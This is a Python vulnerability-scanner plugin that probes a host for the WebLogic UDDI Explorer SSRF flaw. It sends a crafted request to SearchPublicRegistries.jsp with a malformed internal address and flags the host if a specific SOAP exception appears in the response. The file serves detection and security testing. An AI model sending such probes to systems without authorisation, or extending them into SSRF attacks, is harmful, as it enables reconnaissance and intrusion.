#!/usr/bin/env python3

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    try:
        url = '%s://%s:%s/' % (service, ip, port) + \
              '/uddiexplorer/SearchPublicRegistries.jsp?operator=operator' \
              '=10.301.0.0:80&rdoSearch=name&txtSearchname=sdf&' \
              'txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search'

        r = await http_client(ip, port).get(url, timeout=20)
        if r.status_code == 200 and 'weblogic.uddi.client.structures.exception.XML_SoapException: ' \
                                    'no protocol: operator=10.301.0.0:80' in r.text:
            ret = {
                'alert_group': 'WebLogic UDDI Explorer SSRF',
                'affects': '%s://%s:%s/' % (service, ip, port),
                'details': 'WebLogic UDDI Explorer SSRF :\n %s' % url
            }
            return ret
    except Exception as e:
        debug(e)
        

if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 9000, 'http', True, task_msg={})
    run_plugin_test(scan)
